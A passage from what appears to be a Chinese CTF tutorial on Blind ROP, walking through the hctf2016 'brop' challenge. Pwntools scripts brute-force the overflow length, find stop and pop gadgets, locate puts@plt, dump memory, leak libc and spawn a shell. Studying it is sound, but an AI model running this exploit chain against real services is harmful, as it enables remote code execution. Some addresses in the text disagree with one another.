<p><strong>知识点1-stop_gadget</strong>：一般情况下，如果我们把栈上的return address覆盖成某些我们随意选取的内存地址的话，程序有很大可能性会挂掉（比如，该return address指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，从而使得攻击者的连接（connection）被关闭）。但是，<em>存在另外一种情况，即该return address指向了一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态</em>。于是，我们把这种类型的gadget，成为<strong><em>stop gadget</em></strong>，这种gadget对于寻找其他gadgets取到了至关重要的作用。<br><strong>知识点2-可利用的(potentially useful)gadgets</strong>：假设现在我们猜到某个useful gadget，比如pop rdi; ret, <em>但是由于在执行完这个gadget之后进程还会跳到栈上的下一个地址，如果该地址是一个非法地址，那么进程最后还是会crash</em>，在这个过程中攻击者其实并不知道这个useful gadget被执行过了（因为在攻击者看来最后的效果都是进程crash了），因此攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。这个步骤如下图所示：<img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185740.png" alt="Pasted image 20250206185740">但是，如果我们有了stop gadget，那么整个过程将会很不一样. 如果我们在需要尝试的return address之后填上了足够多的stop gadgets，如下图所示：<img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185807.png" alt="Pasted image 20250206185807">那么任何会造成进程crash的gadget最后还是会造成进程crash，而那些useful gadget则会进入block状态。尽管如此，还是有一种特殊情况，即那个我们需要尝试的gadget也是一个stop gadget，那么如上所述，它也会被我们标识为useful gadget。不过这并没有关系，因为之后我们还是需要检查该useful gadget是否是我们想要的gadget。</p>
</blockquote>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a target="_blank" rel="noopener" href="https://github.com/zszcr/ctfrepo/tree/master/BROP/hctf2016-brop-master">ctfrepo/BROP/hctf2016-brop-master at master · zszcr/ctfrepo</a></p>
<h4 id="解答思路"><a href="#解答思路" class="headerlink" title="解答思路"></a>解答思路</h4><p>做题思路：控制puts函数打印出自身的got表地址，通过got地址利用LibcSearcher计算出当前使用的libc版本，接着找到system函数和/bin/sh地址部署到栈中执行</p>
<h4 id="解答步骤"><a href="#解答步骤" class="headerlink" title="解答步骤"></a>解答步骤</h4><h5 id="1-判断栈溢出长度"><a href="#1-判断栈溢出长度" class="headerlink" title="1.判断栈溢出长度"></a>1.判断栈溢出长度</h5><p>首先第一步，需要对栈空间进行判断，确定栈溢出的长度。<br>判断栈溢出可以通过循环不断的增加输入字符的长度，直至程序崩溃<br>可以看到我们出现’WelCome my friend,Do you know password?’这个字样之后等待输入，当输入一个a的时候，接下来会提示’No password, no game’的字样<br>同时在我们输入一串特别长的字符串的时候没有出现’No password, no game’的字样，那么我们就可以使用循环来不断增加字符串长度，并且根据回显结果中是否有’No password, no game’字样来判断到什么长度覆盖了ret返回地址，并且<strong>该长度减一就是栈溢出的长度</strong></p>
<p><strong>循环内容：累加输入字符串长度，填满栈空间</strong><br><strong>循环终止条件：回显结果起始位置字符串为No password, no game</strong><br><strong>执行目的：确定栈溢出长度，为后续所有步骤做准备</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import*
#暴力枚举出栈溢出长度
def getsize():
    i &#x3D; 1
    while 1:
        try:
            p &#x3D; process(&#39;.&#x2F;brop&#39;)
            p.recvuntil(&quot;WelCome my friend,Do you know password?\n&quot;)
            p.send(i*&#39;a&#39;)
            data &#x3D; p.recv()
            p.close()
            if not data.startswith(b&#39;No password&#39;):
            #判断output变量中起始位置是不是No password，如果不是说明已经溢出了
                return i-1
            else:
                i+&#x3D;1
        except EOFError:#主要探测是否具有canary
            p.close()
            return i-1
 
size &#x3D; getsize()
print (&quot;size is : %s &quot;% size)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据上面的代码可以确定栈溢出的长度为72，并且根据返回信息发现没有开启canary保护<br>栈中情况：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">             +---------------------------+
             |           ret             | 
             +---------------------------+
             |            a              | 递增a字符串覆盖原saved ebp位置
      ebp---&gt;+---------------------------+
             |            a+             | 递增a字符串占位填满栈空间
             |           ....            |        .....
             |            a+             | 递增a字符串占位填满栈空间
             |            a+             | 递增a字符串占位填满栈空间
             |            a+             | 递增a字符串占位填满栈空间
             |            a+             | 递增a字符串占位填满栈空间
ebp-？--&gt;+---------------------------+
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h5 id="2-寻找stop-gadget"><a href="#2-寻找stop-gadget" class="headerlink" title="2.寻找stop gadget"></a>2.寻找stop gadget</h5><p>当我们想办法寻找gadget的时候，并不知道程序具体是什么样的，所以需要控制返回地址进而去猜测gadget。那当我们控制返回地址时，一般会出现三种情况</p>
<ol>
<li>程序直接崩溃：ret地址指向的是一个程序内不存在的地址</li>
<li>程序运行一段时间后崩溃：比如运行自己构造的函数，该函数的返回地址指向不存在的地址</li>
<li>程序一直运行而不崩溃<br>stop gadget一般指的是，但程序执行这段代码时，程序进入无限循环，这样使得攻击者能够一直保持连接状态，并且程序一直运行而不崩溃。就像蛇吃自己的尾巴一样，stop gadget最后的ret结尾地址就是程序开启的地址（比如main函数地址）</li>
</ol>
<p>由于看不到二进制程序所以依然还需要使用穷举的方式不断的尝试每一个地址，所以我们从初始的地址0x400000开始，通过循环，不断累加地址进行尝试（前面检测程序保护讲了为什么初始地址是0x400000）。有了循环之后就需要考虑循环终止条件，终止条件可以参考stop gadget的特性，在执行stop gadget的时候程序会回到初始状态并且没有发生崩溃。那么我们可以利用这一特性，使用前面找到的72字节填满栈空间，之后接上穷举的地址，此时穷举地址覆盖了ret地址，那么接下来就会执行穷举地址，如果此时程序发生崩溃就进行下一次循环，如果没有崩溃则打印该地址</p>
<p><strong>循环内容：递增地址，尝试可能的stop gadget</strong><br><strong>循环终止条件：程序不发生崩溃</strong><br><strong>执行目的：确定stop gadget为后面查找brop gadget、puts plt、puts got做准备</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 
def get_stop():
    addr &#x3D; 0x400000
    while 1:
        sleep(0.1)
        addr +&#x3D; 1
        try:
            print(&quot;Now,trying the address is &quot;,hex(addr))
            p &#x3D; process(&#39;.&#x2F;brop&#39;)
            p.recvuntil(b&quot;WelCome my friend,Do you know password?\n&quot;)
            payload &#x3D; b&#39;a&#39;*72 + p64(addr)
            print(&quot;Now,the payload is &quot;,payload)
            p.sendline(payload)
            data &#x3D; p.recv()
            p.close()
            if data.startswith(b&#39;WelCome&#39;):
                print (&quot;main funciton--&gt;[%s]&quot;%hex(addr))
                return addr
            else:
                print (&#39;one success addr : 0x%x&#39;%hex(addr))
        except EOFError as e:
            p.close()
            print(&quot;a bad addr&quot;,hex(addr))
        except:
            print(&quot;Can&#39;t connect,retrying&quot;)
            addr -&#x3D; 1
 
data &#x3D; get_stop()
print (&quot;Success,call Main Function address is&quot;,hex(data))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206201043.png" alt="Pasted image 20250206201043"><br>我们也可以用IDA(仅作验证，brop理应无文件)，可知该地址为main函数</p>
<h5 id="3-寻找brop-gadget"><a href="#3-寻找brop-gadget" class="headerlink" title="3.寻找brop gadget"></a>3.寻找brop gadget</h5><p>在前面找到了stop gadget我们怎么去利用他呢，这时候就需要找到能够控制寄存器的gadget。由于我们的计划是利用puts函数打印出自己的got地址，通过got地址找到对应的libc版本，然后找到system函数和/bin/sh地址部署到栈中执行。那么需要考虑的一点是在调用puts函数之前需要将打印的内容压进rdi寄存器中，那么我们首先就需要通过gadget来控制rdi寄存器。<br>其实在libc_csu_init的结尾一长串pop的gadget中，通过偏移可以得到pop rdi的操作</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+  
|         pop rbx           |  0x00
+---------------------------+
|         pop rbp           |  0x01
+---------------------------+
|         pop r12           |  0x02
+---------------------------+
|         pop r13           |  0x04
+---------------------------+
|         pop r14           |  0x06			
+---------------------------+----------&gt;pop rsi;ret 0x07
|         pop r15           |  0x08		
+---------------------------+----------&gt;pop rdi;ret 0x09
|           ret             |  0x10	
-----------------------------
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到如果以pop rbx为基地址的话向下偏移0x07会得到pop rsi的操作，向下偏移0x09会得到pop rdi的操作。这两个操作就可以帮助我们控制puts函数的输出内容</p>
<p>那么往回想既然我们需要用到pop rdi、rsi的操作就需要知道libc_csu_init结尾6个pop操作的位置。这个时候我们的stop gadget就派上用场了，为了更好地演示stop gadget的使用，这里定义栈上的三种地址</p>
<ul>
<li>Probe - - 探针，也就是我们想要循环递增的代码地址。一般来说都是64位程序，可以直接从0x400000尝试</li>
<li>Stop - - 不会使得程序崩溃的stop gadget的地址</li>
<li>Trap - - 可以导致程序崩溃的地址</li>
</ul>
<p>我们可以通过在栈上拜访不同程序的Stop与Trap从而来识别出正在执行的指令，举几个例子</p>
<ul>
<li>probe, stop, traps, (traps, traps, …)以这样的方式进行排列，可以看一下在栈中的排列<pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+ 
|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|          traps            |	&lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|          stop             |	&lt;----- stop gadget，不会使程序崩溃，作为probe的ret位
+---------------------------+
|          probe            |	&lt;----- 探针
-----------------------------
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。<strong>说明了probe探针中没有pop操作，并且有ret返回</strong>，如果有pop操作的话stop会被pop进寄存器当中，那么probe探针的ret返回就会指向stop的后几位traps，那么就会导致程序崩溃。那么由于在栈布局中stop gadget在probe探针的下一位，说明stop所在位置就是probe探针的ret返回地址位置。如：<pre class="line-numbers language-C" data-language="C"><code class="language-C">ret
xor eax,eax; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>probe, traps, stop, raps以这样的方式进行排列，可以看一下在栈中的排列<pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+ 
|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位
+---------------------------+
|          trap             | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|          probe            | &lt;----- 探针
-----------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。说明probe指针中仅存在一个pop操作，并且有ret返回，在probe探针中只有一个pop操作的时候才会只将probe后面的trap弹进寄存器，如果有两个及两个以上的pop操作的时候，stop gadget也会被弹进寄存器中无法执行。并且在probe探针中ret返回所指的位置是stop才能使程序不崩溃，如：<pre class="line-numbers language-C" data-language="C"><code class="language-C">pop rax; ret
pop rdi; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>probe, trap, trap, trap, trap, trap, trap, stop, traps以这样的方式进行排列，可以看一下在栈中的排列<pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+ 
|           traps           | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+ 
|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位
+---------------------------+ 
|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           trap            | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃
+---------------------------+
|           probe           | &lt;----- 探针
-----------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。说明该probe探针中存在6个pop操作，并且有ret，因为只有在6个pop操作之后probe后面的trap才能弹进寄存器，之后sp指针才能指向stop gadget，这个时候stop gadget只有在ret位置才能被执行，因此程序不会崩溃<br>回到我们之间说的寻找brop gadget环节，我们这个环节要找的就是libc_csu_init最后的6个pop加ret，那么根据前面的讲解我们可以大致的通过trap、stop这种方式做一个简单的排列：<br>addr，trap, trap, trap, trap, trap, trap, stop, traps<br>以上面这种排列的话，addr通过循环不断增加地址位，只有addr所在地址拥有6个pop操作并ret的时候才会执行stopgadget。</li>
</ul>
<p><strong>循环内容：递增地址，找到可以执行6个pop和一个ret操作的gadget</strong><br><strong>循环终止条件：程序不崩溃，并出现起始的输出提示’WelCome’字符</strong><br><strong>执行目的：找到libc_csu_init函数的最后一个gadget，通过偏移计算出popr di地址</strong><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

def get_brop_gadget(length, stop_gadget, addr): #查找brop gadget函数
    try:
        sh &#x3D; process(&#39;.&#x2F;brop&#39;)
        sh.recvuntil(b&#39;password?\n&#39;)
        payload &#x3D; b&#39;a&#39; * length + p64(addr) + p64(0)*6 + p64(stop_gadget) 
        sh.sendline(payload)
        content &#x3D; sh.recv()
        sh.close()
        print (content)
        if not content.startswith(b&#39;WelCome&#39;):
          #判断提示符是否出现起始提示字符，如果有说明程序没崩溃
            return False
        return True
    except Exception:
        sh.close()
        return False

def check_brop_gadget(length, addr):#检查地址
    try:
        sh &#x3D; process(&#39;.&#x2F;brop&#39;)
        sh.recvuntil(b&#39;password?\n&#39;)
        payload &#x3D; b&#39;a&#39; * length + p64(addr) + b&#39;a&#39; * 8 * 10
        sh.sendline(payload)
        content &#x3D; sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


##length &#x3D; getbufferflow_length()
length &#x3D; 72
##get_stop_addr(length)
stop_gadget &#x3D; 0x4005d0
addr &#x3D; 0x4007b0 
#理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，所以大多数的libc中Libc_csu_init函数的起始地址都在0x400750之后，所以为了减少误差，从0x400750开始
while 1:  #循环递增要测试的地址
    print (hex(addr))
    if get_brop_gadget(length, stop_gadget, addr):
        print (&#39;possible brop gadget: 0x%x&#39; % addr)
        if check_brop_gadget(length, addr):
            print (&#39;success brop gadget: 0x%x&#39; % addr)
            break
    addr +&#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206210120.png" alt="Pasted image 20250206210120"></p>
<p>运行之后会得到很多的gadget地址，但是只有0x4007ba是可以继续进行操作的，如果想找到更多的gadget地址可以参考寻找stop gadget方法。<br>栈中布局</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |       	   .....           | trap
             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |       	stop gadget        | stop gadget作为ret返回地址
             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |       			 0    	       | trap
             +---------------------------+
             |         0x400740+         | 递增地址覆盖原ret返回位置
             +---------------------------+
             |             a             | a字符串覆盖原saved ebp位置
      ebp---&gt;+---------------------------+
             |             a             | a字符串占位填满栈空间
             |           ....            |        .....
             |             a             | a字符串占位填满栈空间
             |             a             | a字符串占位填满栈空间
             |             a             | a字符串占位填满栈空间
             |             a             | a字符串占位填满栈空间
ebp-？--&gt;+---------------------------+
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在我们找到brop gadget之后加上0x09的偏移就可以得到pop rdi；ret操作的地址0x4007c3</p>
<h5 id="4-寻找puts-plt地址"><a href="#4-寻找puts-plt地址" class="headerlink" title="4.寻找puts@plt地址"></a>4.寻找puts@plt地址</h5><p>通过前面的操作，我们可以总结一些规律，比如我们需要什么就把他扔进循环递增，总会有一次循环会得到我们想要的结果，在上一步我们找到了pop rdi；ret这个gadget的地址了，那么我们就可以控制puts函数的输出内容。我们就需要用这个gadget找到puts_plt的地址<br>根据上面所说的如果我们调用puts函数，必须将puts函数的参数地址先部署进rdi寄存器中，然后调用puts函数将rdi中地址内的参数打印出来<br>但是由于开启了NX保护，所以我们无法在栈中部署外部的变量或者字符串，那么我们就需要一个程序内部的特殊字符串，并且这个字符串必须唯一的。这里介绍一下，在没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为’ \ x7fELF’</p>
<p><strong>循环内容：递增地址，找到可以进行打印的puts_plt地址</strong><br><strong>循环终止条件：接收字符串出现’\ x7fELF’字样</strong><br><strong>执行目的：为后续找到puts_got地址做准备</strong><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">def get_puts_addr(length, rdi_ret, stop_gadget):
    addr &#x3D; 0x400559
    while 1:
        print (hex(addr))
        sh &#x3D; process(&#39;.&#x2F;brop&#39;)
        sh.recvuntil(b&#39;password?\n&#39;)
        payload &#x3D; b&#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，最后的stop gadget是为了让程序不崩溃
        sh.sendline(payload)
        try:
            content &#x3D; sh.recv()
            if content.startswith(b&#39;\x7fELF&#39;):#判断是否打印\x7fELF
                print (&#39;find puts@plt addr: 0x%x&#39; % addr)
                return addr
            sh.close()
            addr +&#x3D; 1
        except Exception:
            sh.close()
            addr +&#x3D; 1

##length &#x3D; getbufferflow_length()
length &#x3D; 72
rdi_ret &#x3D; 0x4007ba+0x9
##get_stop_addr(length)
stop_gadget &#x3D; 0x4005d0
puts &#x3D; get_puts_addr(length,rdi_ret,stop_gadget)
#find puts@plt addr: 0x400565<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206211035.png" alt="Pasted image 20250206211035"><br>栈中布局</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">             +---------------------------+
             |       	stop gadget        | stop gadget确保程序不崩溃
             +---------------------------+
             |       		0x400000+        | 循环递增地址，作为pop的ret地址
             +---------------------------+
             |        	0x400000 	       | ELF起始地址，地址内存放&#39;、x7fELF&#39;
             +---------------------------+
             |          0x4007c3         | pop rdi；ret地址覆盖原ret返回位置
             +---------------------------+
             |             a             | a字符串覆盖原saved ebp位置
      ebp---&gt;+---------------------------+
             |             a             | a字符串占位填满栈空间
             |           ....            |        .....
             |             a             | a字符串占位填满栈空间
             |             a             | a字符串占位填满栈空间
             |             a             | a字符串占位填满栈空间
             |             a             | a字符串占位填满栈空间
ebp-？--&gt;+---------------------------+
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="5-泄露puts-got地址"><a href="#5-泄露puts-got地址" class="headerlink" title="5.泄露puts_got地址"></a>5.泄露puts_got地址</h5><p>在得到puts_plt地址后，接下来就需要将puts_got地址泄露出来，得到puts_got地址之后就可以利用LibcSearcher查找对应的libc版本，再根据版本找到libc中的system函数和/bin/sh</p>
<p>在泄露之前需要知道一下Linux中plt表和got表的关系，我们就拿puts函数举例<br><pre class="line-numbers language-none"><code class="language-none">															+--------------+
															|    GOT表     |
+---------------------+		   +--------------+	找到真实地址   +--------------+
|  PLT表  | jmp got表  |-----&gt; |puts的真实地址 | -------------&gt;|    puts函数   |
+---------------------+		   +--------------+				  +--------------+
	跳转到got表中存放puts						              |              |
	 函数真实地址的地址								          |				 |
															 | 			 |
															 |		         |
															 |			     |
															 +--------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>我们可以根据上图我们模拟一下call puts的过程，在执行call puts之后程序首先会在PLT表中寻找puts_plt的地址，那么在puts_plt地址中存放的是GOT表中存放puts函数真实地址的地址，接下来会在GOT表中找到存放puts真实地址的地址，接下来打开盒子根据真实找到了puts函数<br>在ret2csu中我们使用的是LibcSearcher查找的函数got表地址，那么由于这道题开启了ASLR，所以不能使用工具去获取地址，那么我们手动的去找，找的就是在puts_plt地址中存放的jmp指令后接的地址。如果觉得不懂，看一下上面的图，jmp指令后面接的就是puts_got的地址。由于不能实用工具，我们只能手动的讲整个PLT部分都dump出来。dump出来的文件重新设置基地址0x400000，再根据前面得到的puts_plt地址找到对应位置，查看该地址内的汇编指令<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">context.log_level &#x3D; &quot;debug&quot;
&#39;&#39;&#39;
dump the bin file
&#39;&#39;&#39;
def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh &#x3D; process(&#39;.&#x2F;brop&#39;)
    payload &#x3D; b&#39;a&#39; * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
#72个a填满栈空间至ret位置，后接pop rdi；ret gadget，循环递增的地址被pop进rdi寄存器，接下来将puts_plt地址防止在gadget ret位置进行调用打印循环递增的地址，最后加上stop gadget防止崩溃
    sh.recvuntil(b&#39;password?\n&#39;)
    sh.sendline(payload)
    try:
        data &#x3D; sh.recv(timeout&#x3D;0.1)
        sh.close()
        try:
            data &#x3D; data[:data.index(b&quot;\nWelCome&quot;)]#将接收的\nWelCome之前的字符串交给data变量
        except Exception:
            data &#x3D; data
        if data &#x3D;&#x3D; b&quot;&quot;: #如果data被赋值之后为空，那么就说明已经完成整个dump过程，添加\x00截断
            data &#x3D; b&#39;\x00&#39;
        return data
    except Exception:
        sh.close()
        return None

##length &#x3D; getbufferflow_length()
length &#x3D; 72
##stop_gadget &#x3D; get_stop_addr(length)
stop_gadget &#x3D; 0x4005d0
##brop_gadget &#x3D; find_brop_gadget(length,stop_gadget)
brop_gadget &#x3D; 0x4007ba
rdi_ret &#x3D; brop_gadget + 9
##puts_plt &#x3D; get_puts_plt(length, rdi_ret, stop_gadget)
puts_plt &#x3D; 0x400565
addr &#x3D; 0x400000
result &#x3D; b&quot;&quot; #准备一个空字符串接收dump出来的代码
while addr &lt; 0x401000:   #从0x400000开始泄露0x1000个字节，足以包含程序的plt部分
    print (hex(addr))
    data &#x3D; leak(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None: #判断接收字符是否为空
        result +&#x3D; b&#39;\x00&#39;
        addr +&#x3D;1
        continue
    else:
        result +&#x3D; data #接收字符串
    addr +&#x3D; len(data)  #addr+接收字符串个数，避免接收重复的字符串

with open(&#39;dump&#39;, &#39;wb&#39;) as f:  #在当前目录下以二进制形式向hollk文件中写
    f.write(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>个文件就是我们dump出来的文件，其实你可以把他比作Windows下脱壳之后的文件。虽然在实际情况下我们看不到二进制文件，但是我们dump出来的plt段的内容可以使用IDA进行查看。将dump文件拖进64位IDA，选择binary File形式打开，选择64-bit mode<br>接下来需要给dump文件设置基地址，因为我们是从0x400000处开始dump的，所以基地址就设为0x400000<br>设置步骤：edit-&gt;segments-&gt;rebase program 将程序的基地址改为 0x400000<br>由于我们之前找到了puts函数的plt地址0x400560，所以我们找到偏移0x560处<br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206220625.png" alt="Pasted image 20250206220625"></p>
<h5 id="6-查询libc版本"><a href="#6-查询libc版本" class="headerlink" title="6.查询libc版本"></a>6.查询libc版本</h5><p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search</a><br>这里我们直接调用本地的就行</p>
<h5 id="7-getshell"><a href="#7-getshell" class="headerlink" title="7.getshell"></a>7.getshell</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">length &#x3D; 72
##stop_gadget &#x3D; get_stop_addr(length)
stop_gadget &#x3D; 0x4005d0
##brop_gadget &#x3D; find_brop_gadget(length,stop_gadget)
brop_gadget &#x3D; 0x4007ba
rdi_ret &#x3D; brop_gadget + 9
##puts_plt &#x3D; get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt &#x3D; 0x400565
##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got &#x3D; 0x601018
ret &#x3D; brop_gadget + 9 + 1
sh &#x3D; process(&#39;.&#x2F;brop&#39;)
sh.recvuntil(b&#39;password?\n&#39;)
payload &#x3D; b&#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
sh.sendline(payload)
data &#x3D; sh.recv(6).ljust(8,b&#39;\x00&#39;)
sh.recv()
puts_addr &#x3D;u64(data)
print(hex(puts_addr))
libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)
libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]
print(hex(libc_base))
system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]
binsh_addr &#x3D; libc_base + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))
payload &#x3D; b&#39;a&#39; * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成功get shell<br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206224413.png" alt="Pasted image 20250206224413"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import*
